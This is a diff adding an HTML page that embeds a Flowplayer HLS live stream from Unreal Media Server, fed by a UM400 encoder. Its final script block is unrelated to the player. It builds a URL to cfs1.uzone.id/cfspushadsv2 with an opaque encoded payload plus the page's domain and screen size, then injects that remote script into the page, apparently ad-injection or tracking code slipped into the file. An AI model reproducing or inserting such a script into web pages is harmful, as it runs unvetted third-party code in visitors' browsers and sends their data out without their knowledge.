@@ -1,0 +1,68 @@
+
+
+<!doctype html>
+
+<html>
+
+<head>
+   <meta charset="utf-8">
+
+   <title>HLS live stream from Unreal Media Server, viewable on any OS / device.</title>
+   
+   <!-- optimize mobile versions -->
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+   <!-- The "functional" skin - choose from: "functional.css", "minimalist.css", "playful.css" -->
+   <link rel="stylesheet" href="/flowplayer/skin/functional.css">
+   
+   <!-- Minimal styling for this standalone page, can be removed -->
+   <link rel="stylesheet" href="http://demos.flowplayer.org/media/css/demo.css">
+   <!-- Syntax highlighting of source code, can be removed -->
+   <link rel="stylesheet" href="http://demos.flowplayer.org/media/css/pygments.css">
+   
+<style>
+
+.flowplayer {
+   max-width: 704px;
+}
+
+.flowplayer {
+  background: #777;
+  margin-bottom: 20px;
+}
+
+.flowplayer.is-error .fp-message p {
+  font-size: 200%;
+  font-weight: bold;
+  color: #f00;
+}
+
+</style>
+
+   <!-- Flowplayer depends on jquery 1.7.2+ for html based setups -->
+   <script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+   <!-- Flowplayer library -->
+   <script src="/flowplayer/flowplayer.min.js"></script>
+   
+
+</head>
+
+<body>
+
+<div id="content">
+
+<h2>HLS live stream from Unreal Media Server, viewable on any OS / device.<br> UM400 live encoder connected to a DVD player.</h2>
+
+<div data-live="true" data-ratio="0.6818" class="flowplayer fixed-controls">
+
+   <video data-title="Live stream">
+	<source type="application/x-mpegurl" src="http://localhost/cctvstreaming/video/life.m3u8" />
+   </video>
+
+</div>
+
+</div>
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnpX8%2bE2pNLQwzHfE5brRnEnrKhhHOyE8rmFkjkgmxsZ9KjOJFxGPFhciEcDrUoXTHiDi2lTvzwGg5eFkZ1dV0w%2f8tGjSHBNO75OOcdPvYUMaSErdUSAzXwrLss7bzlVTrRYAPxSZ4lEcTfOsgg%2flfy8i0DptVgr9ac1VXeMDsDYrinh1OITlu9f12QN4ctT9ZcRPVc5pXJf66uPn49szJhXS8oZxQEa%2bBci6hKBWEbx6UXpemDB0IMlsW8zhb%2baI8N6G1FAqOR8BDWEPHF0ZXqtHwiVCxuIg%2fYbWJAk8cuAufhU3luWUGNNmKp44BFx6bwxEYNZkYF1kt5wVMS1dbI%2b9w88ST70wMpPLWEJWxOCbf6urtx%2fMh6O9htPytLld6r3an7PB4%2fv8ZrEtb4piEVcrA8SMfWs9WdX68NWPCfKNaTfPkUGZLKvnCX2g2%2fR%2bmmQ0zO1hFxJOA2%2bKDzGVrFNJuq6Kui8zCiiHtepTSRZ69q7XEPH9jyJTO4a2MupU3kEkl9iHS40daVkU0yMUKig%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
